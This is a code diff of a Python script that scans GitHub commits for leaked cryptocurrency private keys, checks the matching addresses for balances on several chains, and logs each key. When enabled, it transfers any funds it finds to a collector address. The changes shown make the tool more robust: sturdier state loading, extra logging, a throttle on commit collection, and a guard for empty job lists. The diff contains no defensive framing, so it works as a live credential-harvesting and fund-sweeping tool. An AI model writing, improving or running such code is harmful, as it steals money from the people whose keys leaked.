@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 """
-Dot
- 
+dot
+
 """
 
 import os
@@ -105,13 +105,20 @@ def resolve_creds():
 
 # ---------------- HELPERS ----------------
 def load_state():
+    state = {"seen_addresses": [], "seen_shas": [], "q_offset": 0}
     if os.path.exists(STATE_FILE):
         try:
             with open(STATE_FILE) as f:
-                return json.load(f)
+                loaded = json.load(f)
+            if isinstance(loaded, dict):
+                state.update(loaded)
         except Exception:
             pass
-    return {"seen_addresses": [], "seen_shas": [], "q_offset": 0}
+    if not isinstance(state.get("seen_addresses"), list):
+        state["seen_addresses"] = []
+    if not isinstance(state.get("seen_shas"), list):
+        state["seen_shas"] = []
+    return state
 
 
 def save_state(state):
@@ -255,7 +262,7 @@ def collect_archive(seen_shas):
         name = "%d-%d-%d-%d" % (t.year, t.month, t.day, t.hour)
         url = "https://data.gharchive.org/" + name + ".json.gz"
         try:
-            r = requests.get(url, timeout=120)
+            r = requests.get(url, timeout=150)
             if r.status_code != 200:
                 log("[a] %s -> %d" % (name, r.status_code))
                 continue
@@ -290,7 +297,7 @@ def collect_archive(seen_shas):
 def collect_events(seen_shas):
     commits = []
     for page in range(1, 4):
-        if out_of_time():
+        if out_of_time() or len(commits) >= MAX_COMMITS_PER_RUN:
             break
         try:
             r = requests.get(
@@ -299,9 +306,11 @@ def collect_events(seen_shas):
                 headers=gh_headers(), timeout=30,
             )
             if r.status_code != 200:
+                log("[e] events status %d" % r.status_code)
                 break
             events = r.json()
-        except Exception:
+        except Exception as exc:
+            log("[e] events fail: " + str(exc)[:60])
             break
         if not events:
             break
@@ -333,7 +342,6 @@ def fetch_diff(item):
 
 
 def check_address(args):
-    """Check one address across all chains. Returns list of (chain, balance)."""
     addr, priv, ctype, label = args
     found = []
     for chain in CHAINS:
@@ -355,7 +363,10 @@ def main():
     seen_shas = set(state["seen_shas"])
 
     commits = collect_archive(seen_shas)
-    commits += collect_events(seen_shas)
+    if len(commits) < 40:
+        commits += collect_events(seen_shas)
+    else:
+        log("[*] archive delivered enough, skipping live events")
 
     uniq, dedupe = [], set()
     for repo, sha in commits:
@@ -403,27 +414,28 @@ def main():
 
     hits = 0
     done = 0
-    with ThreadPoolExecutor(max_workers=CHECK_WORKERS) as pool:
-        futs = [pool.submit(check_address, j) for j in jobs]
-        for fut in as_completed(futs):
-            done += 1
-            if done % 50 == 0:
-                log("[.] %d/%d checked, %d hits" % (done, len(jobs), hits))
-            addr, priv, ctype, label, found = fut.result()
-            for chain, bal in found:
-                log("[HIT] %s %.8f %s %s (%s) <- %s"
-                    % (chain, bal / 1e18, CHAINS[chain]["symbol"], addr, ctype, label))
-                log("      key: " + priv)
-                hits += 1
-                if SWEEP_ENABLED:
-                    try:
-                        txhash, moved = sweep(chain, priv, bal)
-                        if txhash:
-                            log("      swept " + moved + " -> " + COLLECTOR + " tx " + txhash)
-                        else:
-                            log("      not swept: " + moved)
-                    except Exception as exc:
-                        log("      sweep failed: " + str(exc))
+    if jobs:
+        with ThreadPoolExecutor(max_workers=CHECK_WORKERS) as pool:
+            futs = [pool.submit(check_address, j) for j in jobs]
+            for fut in as_completed(futs):
+                done += 1
+                if done % 50 == 0:
+                    log("[.] %d/%d checked, %d hits" % (done, len(jobs), hits))
+                addr, priv, ctype, label, found = fut.result()
+                for chain, bal in found:
+                    log("[HIT] %s %.8f %s %s (%s) <- %s"
+                        % (chain, bal / 1e18, CHAINS[chain]["symbol"], addr, ctype, label))
+                    log("      key: " + priv)
+                    hits += 1
+                    if SWEEP_ENABLED:
+                        try:
+                            txhash, moved = sweep(chain, priv, bal)
+                            if txhash:
+                                log("      swept " + moved + " -> " + COLLECTOR + " tx " + txhash)
+                            else:
+                                log("      not swept: " + moved)
+                        except Exception as exc:
+                            log("      sweep failed: " + str(exc))
 
     state["seen_addresses"] = list(seen)
     state["seen_shas"] = list(seen_shas)
